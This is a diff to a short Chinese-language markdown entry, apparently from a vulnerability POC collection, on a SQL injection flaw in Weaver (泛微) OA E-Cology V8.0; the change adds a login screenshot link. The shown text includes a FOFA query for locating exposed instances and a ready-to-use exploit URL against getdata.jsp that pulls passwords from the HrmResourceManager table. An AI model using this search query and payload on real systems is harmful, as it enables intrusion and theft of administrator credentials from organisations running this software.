@@ -1,6 +1,7 @@
 # 泛微OA E-Cology V8.0 SQL注入漏洞
 ## 资产收集：
-fofa：`app="泛微-协同办公OA"`
+fofa：`app="泛微-协同办公OA"`  
+![](./img/login.png)
 ## POC
 - getdata.jsp:`/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager`  
 ![](./img/E-Cology_sql.png)
